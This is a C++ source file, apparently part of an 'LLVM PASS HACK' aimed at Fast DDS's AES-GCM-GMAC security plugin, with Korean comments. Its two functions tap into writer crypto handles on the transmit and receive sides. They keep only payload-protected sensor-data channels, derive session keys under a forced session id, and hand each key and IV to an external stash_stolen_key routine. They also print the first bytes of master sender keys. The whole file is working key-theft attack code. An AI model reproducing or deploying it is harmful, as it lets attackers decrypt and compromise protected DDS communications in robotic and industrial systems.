#include <security/cryptography/AESGCMGMAC_KeyFactory.h>
#include <security/cryptography/AESGCMGMAC_Types.h>
#include <security/cryptography/AESGCMGMAC_Transform.h>

#include <array>
#include <cstring>
#include <cstdio>
#include <mutex>

using namespace eprosima::fastrtps::rtps::security;

extern "C" void stash_stolen_key(const uint8_t* key, const uint8_t* iv);

// 💡 [핵심 필터 매크로] 페이로드(실제 센서 데이터)를 보호하는 채널인지 확인하는 플래그
#ifndef PLUGIN_ENDPOINT_SECURITY_ATTRIBUTES_FLAG_IS_PAYLOAD_PROTECTED
#define PLUGIN_ENDPOINT_SECURITY_ATTRIBUTES_FLAG_IS_PAYLOAD_PROTECTED (1UL << 0)
#endif

// =====================================================================
// 🚀 [송신부(TX) Phase 2] 자신이 생성한 User Payload 키 장전
// =====================================================================
extern "C" void steal_and_bake_key(void* raw_handle) {
    if (raw_handle == nullptr) return;
    AESGCMGMAC_WriterCryptoHandle* local_writer = static_cast<AESGCMGMAC_WriterCryptoHandle*>(raw_handle);
    if (local_writer->nil()) return;

    std::unique_lock<std::mutex> lock((*local_writer)->mutex_);
    
    // 💡 [User Payload 필터] 진짜 센서 데이터 채널이 아니면 가차없이 무시합니다!
    uint32_t attrs = (*local_writer)->EndpointPluginAttributes;
    if ((attrs & PLUGIN_ENDPOINT_SECURITY_ATTRIBUTES_FLAG_IS_PAYLOAD_PROTECTED) == 0) return;

    if ((*local_writer)->EntityKeyMaterial.empty()) return;
    auto& keyMat = (*local_writer)->EntityKeyMaterial.at(0);

    uint32_t force_sync_id = 7777; 
    std::array<uint8_t, 32> precomputed_session_key;
    AESGCMGMAC_Transform temp_transform;
    temp_transform.compute_sessionkey(precomputed_session_key, keyMat, force_sync_id);

    std::array<uint8_t, 12> iv = {0};
    std::memcpy(iv.data(), &force_sync_id, 4);
    stash_stolen_key(precomputed_session_key.data(), iv.data());

    printf("\n==================================================\n");
    printf("[LLVM PASS HACK] 🎯 TX 페이로드 전용 동적 세션키 장전 완료!\n");
    printf("   - TX Master Sender Key (앞 8바이트) : ");
    for(int i=0; i<8; i++) printf("%02X ", keyMat.master_sender_key[i]);
    printf("\n==================================================\n\n");
}

// =====================================================================
// 🛡️ [수신부(RX) Phase 4] 네트워크로 배송된 User Payload 키 장전
// =====================================================================
extern "C" void steal_and_bake_key_rx(void* raw_handle) {
    if (raw_handle == nullptr) return;
    
    DatawriterCryptoHandle* base_handle = static_cast<DatawriterCryptoHandle*>(raw_handle);
    AESGCMGMAC_WriterCryptoHandle& remote_writer = AESGCMGMAC_WriterCryptoHandle::narrow(*base_handle);
    if (remote_writer.nil()) return;

    std::unique_lock<std::mutex> lock(remote_writer->mutex_);
    
    // 💡 [User Payload 필터] 수신부에서도 동일하게 진짜 데이터 채널 키만 낚아챕니다!
    uint32_t attrs = remote_writer->EndpointPluginAttributes;
    if ((attrs & PLUGIN_ENDPOINT_SECURITY_ATTRIBUTES_FLAG_IS_PAYLOAD_PROTECTED) == 0) return;

    if (remote_writer->Entity2RemoteKeyMaterial.empty()) return;
    auto& keyMat = remote_writer->Entity2RemoteKeyMaterial.back();

    uint32_t force_sync_id = 7777; 
    std::array<uint8_t, 32> precomputed_session_key;
    AESGCMGMAC_Transform temp_transform;
    temp_transform.compute_sessionkey(precomputed_session_key, keyMat, force_sync_id);

    std::array<uint8_t, 12> iv = {0};
    std::memcpy(iv.data(), &force_sync_id, 4);
    stash_stolen_key(precomputed_session_key.data(), iv.data());

    printf("\n==================================================\n");
    printf("[LLVM PASS HACK] 🛡️ RX 페이로드 전용 동적 세션키 장전 완료!\n");
    printf("   - RX Master Sender Key (앞 8바이트) : ");
    for(int i=0; i<8; i++) printf("%02X ", keyMat.master_sender_key[i]);
    printf("\n==================================================\n\n");
}